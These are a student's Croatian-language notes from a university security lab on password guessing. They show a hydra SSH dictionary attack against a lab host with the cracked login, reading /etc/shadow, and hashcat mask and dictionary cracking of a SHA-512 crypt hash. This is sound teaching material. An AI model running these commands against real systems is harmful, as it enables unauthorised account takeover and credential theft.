# LAB 5

ONLINE PASSWORD GUESSING

Online napad → dok se ne ulogiramo pokusavamo razlicite lozinke - BRUTE FORCE 

To izvodimo alatom hydra → a very fast network logon cracker which support many different services

Neučinkovito, potreban nam je dictionary -  nalazi se na serveru i dobavljamo ga wget funkcijom

Napad riječnika pokrećemo naredbom

# hydra -l <username> -P dictionary/<group ID>/dictionary_online.txt 10.0.15.1 -V -t 4 ssh

hydra -l celan_dea -P dictionary/g2/dictionary_online.txt 10.0.15.9 -V -t 4 ssh

rezultat traženja:

[22][ssh] host: 10.0.15.9 login: celan_dea password: easemm

![Untitled](LAB%205%20c0440a008f1d4d158559f220d45f7cc7/Untitled.png)

OFFLINE PASSWORD GUESSING

shadow file- pohranjuje lozinke

sudo-administratorske ovlasti

sudo cat /etc/shadow - dobavljamo hash lozinku

prebacili smo lozinku lokalno i sad cemo je probat crackat lokalno

Hashcat alatom izvodimo offline password napad

hashcat - Advanced CPU-based password recovery utility

`hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10`

ovo je dosta sporo - brže sa dictionarijem

`wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g1/`

# hashcat --force -m 1800 -a 0 <password_hash_file> <dictionary_file> --status --status-timer 10

hashcat --force -m 1800 -a 0 lab-5-hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10

Ovakav napad se puno brže izvršava od online napada.

‘oravit’ - rjesenje!!